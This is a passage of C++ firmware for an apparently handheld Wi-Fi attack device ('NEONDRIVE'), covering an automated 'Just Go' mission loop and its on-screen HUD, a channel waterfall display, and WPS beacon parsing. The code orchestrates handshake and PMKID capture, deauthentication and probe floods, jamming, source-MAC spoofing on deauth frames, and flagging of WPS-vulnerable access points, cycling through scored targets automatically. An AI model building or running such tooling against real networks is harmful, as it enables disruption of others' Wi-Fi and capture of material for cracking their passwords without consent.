            justGoLogf("SP3CTER: %u PMKID", (unsigned)specterPmkidCount);
          } else if (spPartial) {
            justGoTargetHadPartial = true;
            justGoRecordModeOutcome(AutoMode::SP3CTER, false);
            justGoLogf("SP3CTER: partial HS %u", (unsigned)specterHsCount);
          } else {
            justGoRecordModeOutcome(AutoMode::SP3CTER, false);
            justGoLogf("SP3CTER: no capture");
          }
          Serial.printf("[SP3CTER-RESULT] succeeded=%d pmkid=%u hs=%u clients=%u ghosts=%lu\n",
                        spSuccess ? 1 : 0,
                        (unsigned)specterPmkidCount,
                        (unsigned)specterHsCount,
                        (unsigned)specterClientCount,
                        (unsigned long)specterGhostCount);
        } else if (justGoMode == AutoMode::PUSH1T) {
          if (push1tWpsDetected) {
            justGoLogf("WPS:%s%s v%02X",
                       push1tWpsLocked ? "LOCKD" : "OPEN",
                       push1tVulnerable ? "+VULN" : "",
                       push1tWpsVersion);
            if (push1tManufacturer[0])
              justGoLogf("MFR:%s", push1tManufacturer);
          } else {
            justGoLogf("PUSH1T: no WPS found");
          }
          Serial.printf("[PUSH1T-RESULT] wps=%d locked=%d vuln=%d ver=0x%02X mfr=%s dev=%s\n",
                        push1tWpsDetected, push1tWpsLocked, push1tVulnerable,
                        push1tWpsVersion, push1tManufacturer, push1tDeviceName);
        } else if (justGoMode == AutoMode::PROBE_FLOOD) {
          justGoLogf("PROBE_FLOOD complete");
        } else if (justGoMode == AutoMode::DEAUTH_FLOOD) {
          justGoLogf("DEAUTH_FLOOD complete");
        }
        disengageAutoMode();
        justGoMode = AutoMode::NONE;
        justGoModeStep++;
        justGoStageStartMs = now;
      }
      break;
    }

    case JustGoStage::COOLDOWN:
      if (now - justGoStageStartMs >= 3000U) {
        if (justGoAutoHop) {
          uint32_t elapsed = now - justGoTargetStartMs;
          justGoLogf("[TARGET DONE] %lus elapsed", elapsed / 1000);
          justGoAdvanceTarget(now);
        } else {
          justGoMode = AutoMode::NONE;
          justGoModeStep = 0;
          justGoStage = JustGoStage::RUN_MODE;
          justGoStageStartMs = now;
        }
      }
      break;

    default:
      break;
  }
}

static void drawJustGo() {
  // Source: Generated by ChatGPT/Codex for NEONDRIVE Just Go Mission HUD redesign.
  auto justGoStageText = [](JustGoStage s) -> const char* {
    switch (s) {
      case JustGoStage::SCAN: return "SCAN";
      case JustGoStage::SELECT_TARGET: return "SELECT";
      case JustGoStage::RUN_MODE: return "RUN";
      case JustGoStage::COOLDOWN: return "COOLDOWN";
      default: return "IDLE";
    }
  };
  auto justGoFmtElapsed = [](uint32_t ms, char* out, size_t n) {
    const uint32_t sec = ms / 1000U;
    const uint32_t mm = sec / 60U;
    const uint32_t ss = sec % 60U;
    snprintf(out, n, "T+%02lu:%02lu", (unsigned long)mm, (unsigned long)ss);
  };
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  if (!justGoLayoutDrawn) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("Just Go // Mission HUD");
    drawUniversalBackground();
    layoutActionDockBox();
    justGoLayoutDrawn = true;
  } else {
    // Dirty-region style refresh: repaint only Just Go content and command bar.
    tft.fillRect(content.x, content.y, content.w, content.h, TFT_BLACK);
    tft.fillRect(bottom.x, bottom.y, bottom.w, bottom.h, TFT_BLACK);
  }

  layoutActionDockBox();
  const int rightLimit = uiRightLimitForBand(content.y, content.h);
  const int rightX = min(max(content.x + 160, ActionDockBoxX - 2), rightLimit - 72);
  const int rightW = max(72, rightLimit - rightX);
  const int leftX = content.x;
  const int leftW = max(120, rightX - leftX - 4);
  const int y0 = content.y;

  // Top status strip.
  const int statusH = 20;
  tft.drawRoundRect(leftX, y0, leftW + rightW + 4, statusH, 4, TFT_CYAN);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(justGoActive ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
  tft.drawString(justGoActive ? "RUNNING" : "IDLE", leftX + 4, y0 + 5);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString(String("STAGE: ") + justGoStageText(justGoStage), leftX + 58, y0 + 5);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  char elapsedBuf[16];
  const uint32_t elapsedBase = (hasTarget && justGoTargetStartMs > 0) ? justGoTargetStartMs : justGoStageStartMs;
  justGoFmtElapsed(millis() - elapsedBase, elapsedBuf, sizeof(elapsedBuf));
  tft.drawString(elapsedBuf, leftX + leftW + 4 + 2, y0 + 5);
  if (justGoTargetCount > 0) {
    char tgtIdx[20];
    snprintf(tgtIdx, sizeof(tgtIdx), "TARGET %u/%u", (unsigned)(justGoTargetPos + 1), (unsigned)justGoTargetCount);
    tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
    tft.drawString(tgtIdx, leftX + 132, y0 + 5);
  }

  // Pipeline row: SCN | LCK | Y0NK | P1T | JAM | RAW | HOP
  const int pipeY = y0 + statusH + 4;
  const int pipeH = 16;
  const char* pLabels[7] = {"SCN", "LCK", "Y0NK", "P1T", "JAM", "SPX", "HOP"};
  const int pipeW = (leftW - 10) / 7;
  for (int i = 0; i < 7; ++i) {
    const int bx = leftX + 2 + (i * pipeW);
    uint16_t col = TFT_DARKGREY;
    if (i == 0 && (justGoStage == JustGoStage::SCAN || justGoLastStage != JustGoStage::IDLE)) col = TFT_GREEN;
    if (i == 1 && hasTarget && lockChannel) col = TFT_CYAN;
    if (i == 2 && (justGoMode == AutoMode::Y0INK || justGoLastMode == AutoMode::Y0INK)) col = TFT_GREEN;
    if (i == 3 && (justGoMode == AutoMode::PUSH1T || justGoLastMode == AutoMode::PUSH1T)) col = push1tVulnerable ? TFT_RED : TFT_MAGENTA;
    if (i == 4 && (justGoMode == AutoMode::JAMMIT || justGoLastMode == AutoMode::JAMMIT)) col = TFT_GREEN;
    if (i == 5 && (justGoMode == AutoMode::SP3CTER || justGoLastMode == AutoMode::SP3CTER)) col = TFT_GREEN;
    if (i == 6 && (justGoStage == JustGoStage::COOLDOWN || justGoLastStage == JustGoStage::COOLDOWN)) col = TFT_CYAN;
    if ((i == 0 && justGoStage == JustGoStage::SCAN) ||
        (i == 1 && justGoStage == JustGoStage::SELECT_TARGET) ||
        (i == 2 && justGoMode == AutoMode::Y0INK) ||
        (i == 3 && justGoMode == AutoMode::PUSH1T) ||
        (i == 4 && justGoMode == AutoMode::JAMMIT) ||
        (i == 5 && justGoMode == AutoMode::SP3CTER) ||
        (i == 6 && justGoStage == JustGoStage::COOLDOWN)) {
      col = TFT_YELLOW;
    }
    if (!justGoActive && justGoStage == JustGoStage::IDLE) col = TFT_DARKGREY;
    tft.drawRoundRect(bx, pipeY, pipeW - 2, pipeH, 3, col);
    tft.setTextColor(col, TFT_BLACK);
    tft.drawString(pLabels[i], bx + 3, pipeY + 4);
  }

  // Target card.
  const int targetY = pipeY + pipeH + 4;
  const int targetH = 56;
  tft.drawRoundRect(leftX, targetY, leftW, targetH, 4, TFT_MAGENTA);
  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("TARGET LOCK", leftX + 4, targetY + 3);
  const ApRecord* curr = hasTarget ? &target : nullptr;
  String ssid = curr ? (curr->ssid.isEmpty() ? String("(hidden)") : curr->ssid) : String("(none)");
  while (ssid.length() > 4 && tft.textWidth(ssid) > (leftW - 8)) ssid.remove(ssid.length() - 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString(ssid, leftX + 4, targetY + 16);
  if (curr) {
    String row1 = String(authToStr(curr->auth)) + " | CH " + String(curr->channel) + " | RSSI " + String(curr->rssi);
    while (row1.length() > 4 && tft.textWidth(row1) > (leftW - 8)) row1.remove(row1.length() - 1);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString(row1, leftX + 4, targetY + 28);
    String bssid = curr->bssid;
    while (bssid.length() > 4 && tft.textWidth(bssid) > 74) bssid.remove(bssid.length() - 1);
    String row2 = String("BSSID ") + bssid;
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString(row2, leftX + 4, targetY + 40);
  } else {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("No active target", leftX + 4, targetY + 30);
  }

  // Mode/step line under target card.
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  String modeLine = String("MODE: ") + autoModeStr(justGoMode) + "  STEP:" + String((unsigned)(justGoModeStep + 1)) + "/" +
                    String((unsigned)(hasTarget ? justGoSequenceLength(target) : 1)) + "  LOCK:" + (lockChannel ? "ON" : "OFF");
  while (modeLine.length() > 8 && tft.textWidth(modeLine) > (leftW - 4)) modeLine.remove(modeLine.length() - 1);
  tft.drawString(modeLine, leftX + 2, targetY + targetH + 2);

  // Right-side Mission HUD stat stack panel.
  const int statsY = max(y0 + statusH + 2, ActionDockBoxY + ActionDockBoxH + 2);
  const int statsH = max(56, bottom.y - statsY - 24);
  tft.drawRoundRect(rightX, statsY, rightW, statsH, 4, TFT_CYAN);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("STATS", rightX + 4, statsY + 2);

  // Compute values for HUD fields
  const int hudHs    = YoinkEngine::isRunning() ? YoinkEngine::getHandshakeCount() : 0;
  const int hudPmk   = YoinkEngine::isRunning() ? YoinkEngine::getPmkidCount()    : 0;
  const int hudCl    = YoinkEngine::isRunning() ? YoinkEngine::getClientCount()    : (int)jammitClientCount;
  const int hudScore = hasTarget ? justGoScoreTarget(target) : 0;

  // CAPTURE state label
  const char* capState = "NONE";
  if (justGoTargetSucceeded)          capState = "VALID";
  else if (hudHs > 0 || hudPmk > 0)  capState = "PMKID";
  else if (justGoTargetHadPartial)    capState = "PARTIAL";
  else if (justGoTargetHadClient)     capState = "CLIENT";

  // NEXT action label
  const char* nextAct = "LISTEN";
  if (justGoStage == JustGoStage::SCAN)          nextAct = "SCAN";
  else if (justGoStage == JustGoStage::COOLDOWN) nextAct = "HOP";
  else if (justGoMode == AutoMode::Y0INK  && !justGoPostStimulusWindow)
    nextAct = justGoTargetHadClient ? "STIMULUS" : "LISTEN";
  else if (justGoMode == AutoMode::Y0INK  && justGoPostStimulusWindow)  nextAct = "SP3CTER";
  else if (justGoMode == AutoMode::JAMMIT)                              nextAct = "RETRY";
  else if (justGoMode == AutoMode::SP3CTER)                             nextAct = "HOP";
  else if (justGoTargetSucceeded)                                       nextAct = "RAW";

  char s1[22], s2[22], s3[22], s4[22], s5[22], s6[22], s7[22], s8[22], s9[22];
  snprintf(s1, sizeof(s1), "NETS   %d", apCount);
  snprintf(s2, sizeof(s2), "TGT    %u/%u", (unsigned)(justGoTargetPos+1), (unsigned)justGoTargetCount);
  snprintf(s3, sizeof(s3), "HS     %d", hudHs);
  snprintf(s4, sizeof(s4), "PMK    %d", hudPmk);
  snprintf(s5, sizeof(s5), "CLNT   %d", hudCl);
  snprintf(s6, sizeof(s6), "SCORE  %d", hudScore);
  snprintf(s7, sizeof(s7), "WIN %u/%u", (unsigned)justGoSessionSuccesses, (unsigned)justGoSessionAttempts);
  // WPS row: show detection state and vulnerability
  if (!push1tWpsDetected)       snprintf(s8, sizeof(s8), "WPS    --");
  else if (push1tVulnerable)    snprintf(s8, sizeof(s8), "WPS  VULN!");
  else if (push1tWpsLocked)     snprintf(s8, sizeof(s8), "WPS  LOCK");
  else                          snprintf(s8, sizeof(s8), "WPS  SAFE");
  snprintf(s9, sizeof(s9), "%-7s>%-5s", capState, nextAct);

  const char*    rows[9] = {s1, s2, s3, s4, s5, s6, s7, s8, s9};
  const uint16_t cols[9] = {TFT_CYAN, TFT_MAGENTA, TFT_GREEN, TFT_YELLOW,
                             TFT_CYAN, TFT_WHITE, TFT_GREEN,
                             (uint16_t)(push1tVulnerable ? TFT_RED : (push1tWpsDetected ? TFT_MAGENTA : TFT_DARKGREY)),
                             TFT_ORANGE};
  int sy = statsY + 12;
  for (int i = 0; i < 9; ++i) {
    if (sy > statsY + statsH - 10) break;
    tft.setTextColor(cols[i], TFT_BLACK);
    String line = rows[i];
    while (line.length() > 4 && tft.textWidth(line) > (rightW - 8)) line.remove(line.length() - 1);
    tft.drawString(line, rightX + 4, sy);
    sy += 9;
  }

  // Live console.
  const int consoleY = targetY + targetH + 14;
  const int consoleH = max(28, bottom.y - consoleY - 22);
  tft.drawRoundRect(leftX, consoleY, leftW + rightW + 4, consoleH, 4, TFT_CYAN);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString("EVENT STREAM", leftX + 4, consoleY + 2);
  const int lineStep = 9;
  const int maxLines = max(1, (consoleH - 14) / lineStep);
  int startIdx = (monitorLineCount > maxLines) ? (monitorLineCount - maxLines) : 0;
  int yLine = consoleY + 12;
  for (int i = startIdx; i < monitorLineCount; ++i) {
    tft.setTextColor(monitorLines[i].color, TFT_BLACK);
    String ln = monitorLines[i].text;
    while (ln.length() > 4 && tft.textWidth(ln) > (leftW + rightW - 2)) ln.remove(ln.length() - 1);
    tft.drawString(ln, leftX + 4, yLine);
    yLine += lineStep;
    if (yLine > consoleY + consoleH - 10) break;
  }

  // Bottom command bar: Back | STD <> | Spray ON/OFF | GO/STOP
  const int gap = 4;
  const int btnW = (bottom.w - (gap * 3)) / 4;
  btnJustGoBack = {bottom.x, bottom.y, btnW, UI_BUTTON_H, "Back"};
  const char* prof = profileNames[(int)justGoProfile];
  static char profLbl[24];
  snprintf(profLbl, sizeof(profLbl), "%s <>", prof);
  btnJustGoProfilePrev = {bottom.x + btnW + gap, bottom.y, btnW, UI_BUTTON_H, profLbl};
  btnJustGoProfileNext = {0, 0, 0, 0, ""}; // disabled visual twin; keep handler compatibility
  btnJustGoSpray = {bottom.x + (btnW + gap) * 2, bottom.y, btnW, UI_BUTTON_H, justGoSprayPray ? "Spray ON" : "Spray OFF"};
  btnJustGoToggle = {bottom.x + (btnW + gap) * 3, bottom.y, btnW, UI_BUTTON_H, justGoActive ? "STOP" : "GO"};
  drawButton(btnJustGoBack, TFT_NAVY, TFT_CYAN, TFT_WHITE);
  drawButton(btnJustGoProfilePrev, TFT_BLACK, TFT_YELLOW, TFT_WHITE);
  drawButton(btnJustGoSpray, justGoSprayPray ? TFT_DARKGREEN : TFT_DARKGREY, TFT_MAGENTA, TFT_WHITE);
  drawButton(btnJustGoToggle, justGoActive ? TFT_MAROON : TFT_DARKGREEN, TFT_RED, TFT_WHITE);

  // Keep stay-minute controls available with compact hitboxes.
  const int stayY = bottom.y - 14;
  btnJustGoStayMinus = {rightX, stayY, 18, 12, "-"};
  btnJustGoStayPlus = {rightX + 20, stayY, 18, 12, "+"};
  drawButton(btnJustGoStayMinus, TFT_BLACK, TFT_MAGENTA, TFT_WHITE);
  drawButton(btnJustGoStayPlus, TFT_BLACK, TFT_MAGENTA, TFT_WHITE);
  char stayBuf[20];
  snprintf(stayBuf, sizeof(stayBuf), "%umin", (unsigned)justGoStayMinutes);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString(stayBuf, rightX + 40, stayY + 2);

  // Stable signature for low-flicker refresh decisions.
  uint32_t sig = 2166136261u;
  auto mix = [&](uint32_t v) { sig ^= v; sig *= 16777619u; };
  mix((uint32_t)justGoActive);
  mix((uint32_t)justGoStage);
  mix((uint32_t)justGoMode);
  mix((uint32_t)justGoModeStep);
  mix((uint32_t)justGoTargetCount);
  mix((uint32_t)justGoTargetPos);
  mix((uint32_t)monitorLineCount);
  mix((uint32_t)sniffPps);
  mix((uint32_t)apCount);
  mix((uint32_t)hasTarget);
  mix((uint32_t)lockChannel);
  mix((uint32_t)justGoTargetSucceeded);
  mix((uint32_t)justGoTargetHadClient);
  mix((uint32_t)justGoSessionSuccesses);
  mix((uint32_t)justGoSessionAttempts);
  mix((uint32_t)push1tWpsDetected);
  mix((uint32_t)push1tVulnerable);
  mix((uint32_t)specterPmkidCount);
  mix((uint32_t)specterHsCount);
  mix((uint32_t)(specterGhostCount & 0xFF));
  justGoLastRenderSig = sig;

  drawBorder();
}

static uint16_t scopeWaterfallColor(uint8_t level) {
  // Thermal-style palette for spectrum waterfall rendering.
  if (level >= 96) return TFT_WHITE;
  if (level >= 88) return TFT_RED;
  if (level >= 76) return TFT_ORANGE;
  if (level >= 62) return TFT_YELLOW;
  if (level >= 48) return TFT_GREEN;
  if (level >= 32) return TFT_CYAN;
  if (level >= 18) return 0x041F;  // deep blue
  if (level > 0) return 0x0010;    // near-black blue
  return TFT_BLACK;
}

static void scopeResetWaterfall() {
  memset(scopeWaterfall, 0, sizeof(scopeWaterfall));
  scopeWaterfallRows = 0;
}

static void scopePushWaterfallFrame() {
  float chPower[SCOPE_CH_COUNT + 1] = {0};  // 1..13 used

  // Aggregate AP energy onto channels with spill-over to adjacent channels.
  for (int i = 0; i < apCount; i++) {
    int ch = aps[i].channel;
    if (ch < 1 || ch > SCOPE_CH_COUNT) continue;

    int clamped = clampi(aps[i].rssi, -100, -25);
    float base = (float)(clamped + 100);  // 0..75
    // Boost stronger APs so dominant channels pop in the waterfall.
    base = (base * base) / 40.0f;

    for (int d = -2; d <= 2; d++) {
      int c2 = ch + d;
      if (c2 < 1 || c2 > SCOPE_CH_COUNT) continue;
      float k = 0.0f;
      if (d == 0) k = 1.00f;
      else if (d == -1 || d == 1) k = 0.45f;
      else k = 0.20f;
      chPower[c2] += (base * k);
    }
  }

  float maxPower = 1.0f;
  for (int ch = 1; ch <= SCOPE_CH_COUNT; ch++) {
    if (chPower[ch] > maxPower) maxPower = chPower[ch];
  }

  // Push historical rows down (newest row at 0).
  int rowsToShift = scopeWaterfallRows;
  if (rowsToShift >= SCOPE_WATERFALL_MAX_ROWS) rowsToShift = SCOPE_WATERFALL_MAX_ROWS - 1;
  for (int row = rowsToShift; row > 0; row--) {
    memcpy(scopeWaterfall[row], scopeWaterfall[row - 1], SCOPE_WATERFALL_BINS);
  }

  // Build a smooth spectrum line across bins by interpolating channel power.
  for (int b = 0; b < SCOPE_WATERFALL_BINS; b++) {
    float fch = 1.0f + ((float)b * 12.0f) / (float)(SCOPE_WATERFALL_BINS - 1);  // 1..13
    int cLo = (int)fch;
    if (cLo < 1) cLo = 1;
    if (cLo > SCOPE_CH_COUNT) cLo = SCOPE_CH_COUNT;
    int cHi = cLo + 1;
    if (cHi > SCOPE_CH_COUNT) cHi = SCOPE_CH_COUNT;
    float t = fch - (float)cLo;
    float p = (chPower[cLo] * (1.0f - t)) + (chPower[cHi] * t);
    float norm = p / maxPower;
    if (norm < 0.0f) norm = 0.0f;
    if (norm > 1.0f) norm = 1.0f;

    // Gamma emphasis to make weak/medium signals visible like a spectrum waterfall.
    float shaped = sqrtf(norm);
    uint8_t level = (uint8_t)(shaped * 100.0f);
    scopeWaterfall[0][b] = level;
  }

  if (scopeWaterfallRows < SCOPE_WATERFALL_MAX_ROWS) {
    scopeWaterfallRows++;
  }
}

static void drawScopeGraph() {
  layoutActionDockBox();
  const UiRect bottom = computeBottomBarRect();
  const int w = tft.width();
  const int screenTopY = 0;
  const int pad = UI_SAFE_MARGIN;
  const int contentX = pad;
  const int contentW = w - (pad * 2);
  const int titleY = screenTopY + 3;
  const int metaY = titleY;
  const int titleTextH = 8;                  // text size 1
  const int dataY = titleY + titleTextH + 5; // exactly 5px below "SCOPE" title text
  int dataH = bottom.y - dataY - 2;
  if (dataH < 40) dataH = 40;
  const int gap = 4;
  int wfH = (dataH * 64) / 100;
  if (wfH < 70) wfH = 70;
  if (wfH > dataH - 30) wfH = dataH - 30;
  int apH = dataH - wfH - gap;
  if (apH < 26) {
    apH = 26;
    wfH = dataH - apH - gap;
    if (wfH < 40) wfH = 40;
  }

  const int wfPanelX = contentX;
  const int wfPanelY = dataY;
  // Per requirement: CH waterfall always ends 5px before ActionDock left edge.
  const int wfRightLimit = min(contentX + contentW, max(contentX + 40, uiActionDockSafeLeft()));
  const int wfPanelW = wfRightLimit - wfPanelX;
  const int wfPanelH = wfH;
  const int apPanelX = contentX;
  const int apPanelY = wfPanelY + wfPanelH + gap;
  const int apPanelW = contentW;
  const int apPanelH = apH;

  const int buttonGap = 6;
  const int buttonW = (bottom.w - buttonGap) / 2;
  btnScopeBack = {bottom.x, bottom.y, buttonW, UI_BUTTON_H, "Back"};
  btnScopeRefresh = {bottom.x + buttonW + buttonGap, bottom.y, buttonW, UI_BUTTON_H, "Refresh"};

  if (!scopeLayoutDrawn) {
    scopeMetaDrawnSig = 0;
    for (int i = 0; i < 5; i++) {
      scopeApDrawnSig[i] = 0;
    }
    scopeLayoutDrawn = true;
  }

  tft.fillRect(0, screenTopY, w, bottom.y - screenTopY - 1, TFT_BLACK);
  drawButton(btnScopeBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnScopeRefresh, TFT_DARKCYAN, TFT_CYAN, TFT_WHITE);
  drawBorder();

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("SCOPE", contentX, titleY);

  char meta[72];
  if (wifiIsScanning) {
    snprintf(meta, sizeof(meta), "Scanning...");
  } else {
    uint32_t age = (millis() - scopeLastScanMs) / 1000;
    snprintf(meta, sizeof(meta), "APs:%d   Last scan:%lus ago", apCount, (unsigned long)age);
  }
  const uint32_t metaSig = hashText(meta);
  if (metaSig != scopeMetaDrawnSig) {
    tft.setTextColor(wifiIsScanning ? TFT_YELLOW : TFT_GREEN, TFT_BLACK);
    tft.drawString(meta, contentX + 58, metaY);
    scopeMetaDrawnSig = metaSig;
  }

  // Main panels consume nearly all content area.
  tft.drawRect(wfPanelX, wfPanelY, wfPanelW, wfPanelH, TFT_DARKGREY);
  tft.drawRect(apPanelX, apPanelY, apPanelW, apPanelH, TFT_DARKGREY);

  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("CH Waterfall", wfPanelX + 6, wfPanelY + 4);
  tft.drawString("Top AP RSSI", apPanelX + 6, apPanelY + 4);

  // Waterfall heatmap (full-width, top panel)
  const int wfInnerX = wfPanelX + 4;
  const int wfInnerY = wfPanelY + 14;
  const int wfInnerW = wfPanelW - 8;
  const int wfInnerH = wfPanelH - 28;
  tft.fillRect(wfInnerX, wfInnerY, wfInnerW, wfInnerH, TFT_BLACK);
  if (wfInnerW > 0 && wfInnerH > 0) {
    for (int py = 0; py < wfInnerH; py++) {
      int srcRow = (py * SCOPE_WATERFALL_MAX_ROWS) / wfInnerH;
      if (srcRow < 0) srcRow = 0;
      if (srcRow >= SCOPE_WATERFALL_MAX_ROWS) srcRow = SCOPE_WATERFALL_MAX_ROWS - 1;
      const bool rowValid = (srcRow < scopeWaterfallRows);
      for (int px = 0; px < wfInnerW; px++) {
        int srcBin = (px * SCOPE_WATERFALL_BINS) / wfInnerW;
        if (srcBin < 0) srcBin = 0;
        if (srcBin >= SCOPE_WATERFALL_BINS) srcBin = SCOPE_WATERFALL_BINS - 1;
        uint8_t level = rowValid ? scopeWaterfall[srcRow][srcBin] : 0;
        tft.drawPixel(wfInnerX + px, wfInnerY + py, scopeWaterfallColor(level));
      }
    }
  }

  // Channel guide lines + labels on top of waterfall.
  if (wfInnerW > 1 && wfInnerH > 0) {
    for (int ch = 1; ch <= SCOPE_CH_COUNT; ch++) {
      int x = wfInnerX + ((ch - 1) * (wfInnerW - 1)) / (SCOPE_CH_COUNT - 1);
      if (ch == 1 || ch == 6 || ch == 11 || ch == 13) {
        char cbuf[4];
        snprintf(cbuf, sizeof(cbuf), "%d", ch);
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.drawString(cbuf, x - 2, wfPanelY + wfPanelH - 12);
      }
      tft.drawFastVLine(x, wfInnerY, wfInnerH, 0x18E3);
    }
  }

  // AP RSSI bars (full-width bottom panel)
  const int apRows = 5;
  const int apInnerX = apPanelX + 4;
  const int apInnerY = apPanelY + 16;
  const int apInnerW = apPanelW - 8;
  const int apInnerH = apPanelH - 20;
  tft.fillRect(apInnerX, apInnerY, apInnerW, apInnerH, TFT_BLACK);
  const int rowH = (apInnerH > 0) ? (apInnerH / apRows) : 0;
  const int nameW = (apInnerW * 38) / 100;
  const int rssiW = 56;
  const int barMaxW = apInnerW - nameW - rssiW - 6;

  for (int i = 0; i < apRows; i++) {
    const int y = apInnerY + (i * rowH);
    if (rowH < 7 || y >= (apInnerY + apInnerH)) break;
    char name[18];
    int rssi = -127;
    int barW = 0;

    if (i >= apCount) {
      snprintf(name, sizeof(name), "--");
    } else {
      const ApRecord& ap = aps[i];
      const int clamped = clampi(ap.rssi, -100, -30);
      const int level = clamped + 100;  // 0..70
      barW = (level * barMaxW) / 70;
      rssi = ap.rssi;
      snprintf(name, sizeof(name), "%.16s", ap.ssid.c_str());
    }

    tft.setTextColor((i >= apCount) ? TFT_DARKGREY : TFT_WHITE, TFT_BLACK);
    tft.drawString(name, apInnerX + 2, y + 1);

    const int barX = apInnerX + nameW;
    const int barY = y + 2;
    const int bh = rowH - 4;
    tft.drawRect(barX, barY, barMaxW, bh, TFT_DARKGREY);
    if (barW > 0) {
      tft.fillRect(barX + 1, barY + 1, barW, bh - 2, TFT_CYAN);
    }

    if (i < apCount) {
      char rssiTxt[12];
      snprintf(rssiTxt, sizeof(rssiTxt), "%ddBm", rssi);
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.drawString(rssiTxt, barX + barMaxW + 4, y + 1);
    }
  }
}

static void scopeTick() {
  if (screen != ScreenId::SCOPE_GRAPH) return;
  if (scopeScanActive) {
    const int poll = pollWifiScanAsync();
    if (poll == 0) {
      if (millis() - scopeScanStartedMs > 30000) {
        scopeScanActive = false;
        wifiIsScanning = false;
        WiFi.scanDelete();
        drawScopeGraph();
      }
      return;
    }
    scopeScanActive = false;
    if (poll > 0) {
      scopePushWaterfallFrame();
      scopeLastScanMs = millis();
    }
    drawScopeGraph();
    return;
  }
  if (wifiIsScanning) return;

  uint32_t now = millis();
  if (now - scopeLastScanMs < 4000) return;

  scopeScanActive = startWifiScanAsync();
  if (scopeScanActive) {
    scopeScanStartedMs = millis();
  } else {
    wifiIsScanning = false;
  }
  drawScopeGraph();
}

// Stop currently active automation mode and clean up resources
// Wrapper for applying spoof to deauth frames (called by JAMMIT/deauth logic)
static void applyDeauthSpoofing(uint8_t* frame, int frameLen) {
  if (!frame || frameLen < 26) return;
  
  uint8_t spoofedSrc[6];
  applyActiveSpoofMode(spoofedSrc);
  
  // Apply spoofing to source MAC (offset 10 in deauth frame)
  memcpy(frame + 10, spoofedSrc, 6);
  
  if (activeSpoofMode == SpoofMode::MAC_POOL) {
    addMacToPool(spoofedSrc);  // Track spoofed MACs for pool rotation
  }
}

// Export threat assessment data to SD card (for Android app analysis)
static void exportThreatDataToSD() {
  // Threat data export disabled - DRAM buffer removed to make room for LED victory flash
  // Threat analysis is still logged via serial [THREAT] messages
  Serial.printf("[threat] Threat export stub (buffer removed for LED flash feature)\n");
}

// ============================================================
// PUSH1T — WPS Intelligence & Assessment Engine
// Double entendre: "push it" (WPS Push-Button) + Salt-N-Pepa
// ============================================================

// Parse WPS TLV attribute block (called from beacon handler, non-blocking).
static void push1tParseWpsTlv(const uint8_t* data, uint8_t dataLen) {
  const uint8_t* p   = data;
  const uint8_t* end = data + dataLen;
  while (p + 4 <= end) {
    uint16_t attr = ((uint16_t)p[0] << 8) | p[1];
    uint16_t alen = ((uint16_t)p[2] << 8) | p[3];
    p += 4;
    if (p + alen > end) break;
    switch (attr) {
      case 0x104A: // Version
        if (alen >= 1) push1tWpsVersion = p[0];
        break;
      case 0x1057: // AP Setup Locked
        if (alen >= 1) push1tWpsLocked = (p[0] != 0);
        break;
      case 0x1021: // Manufacturer
        { uint8_t n = (uint8_t)min((uint32_t)(sizeof(push1tManufacturer) - 1), (uint32_t)alen);
          memcpy(push1tManufacturer, p, n);
          push1tManufacturer[n] = '\0'; }
        break;
      case 0x1023: // Model Name
        { uint8_t n = (uint8_t)min((uint32_t)(sizeof(push1tDeviceName) - 1), (uint32_t)alen);
          memcpy(push1tDeviceName, p, n);
          push1tDeviceName[n] = '\0'; }
        break;
    }
    p += alen;
  }
  push1tVulnerable = push1tWpsDetected && !push1tWpsLocked && (push1tWpsVersion == 0x10);
}

// Called from handleCapturedPacket for every beacon frame while PUSH1T is active.
// Checks if beacon is from the current target and extracts WPS IE.
static void push1tHandleBeacon(const uint8_t* frame, uint32_t len) {
  if (!push1tBssidCached || len < 38) return;
  // Beacon: addr2 (SA/BSSID) is at offset 10
  if (memcmp(frame + 10, push1tTargetBssid, 6) != 0) return;

  // Walk tagged parameters — fixed params start at offset 36 in beacons
  const uint8_t* ie  = frame + 36;
  const uint8_t* end = frame + len;
  while (ie + 2 <= end) {
    uint8_t ie_type = ie[0];
    uint8_t ie_len  = ie[1];
    if (ie + 2 + ie_len > end) break;
    // Vendor Specific (0xDD) with WPS OUI 00:50:F2:04
    if (ie_type == 0xDD && ie_len >= 4 &&
        ie[2] == 0x00 && ie[3] == 0x50 && ie[4] == 0xF2 && ie[5] == 0x04) {
      push1tWpsDetected = true;
      if (ie_len > 4) push1tParseWpsTlv(ie + 6, ie_len - 4);
      // Propagate to ApRecord for scoring on subsequent sessions
      if (hasTarget) {
        target.wpsEnabled = true;
        target.wpsLocked  = push1tWpsLocked;
        target.wpsVersion = push1tWpsVersion;
      }
    }
    ie += 2 + ie_len;
  }
}

// Send a minimal 802.11 Probe Request with WPS IE to elicit a Probe Response.
static void push1tSendProbeRequest() {
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
  neon_rf_set_last_action("push1tSendProbeRequest");
  neon_rf_log_unsupported("push1tSendProbeRequest");
  return;
#endif
  if (!hasTarget || !push1tBssidCached) return;

  // Minimal WPS IE (39 bytes):
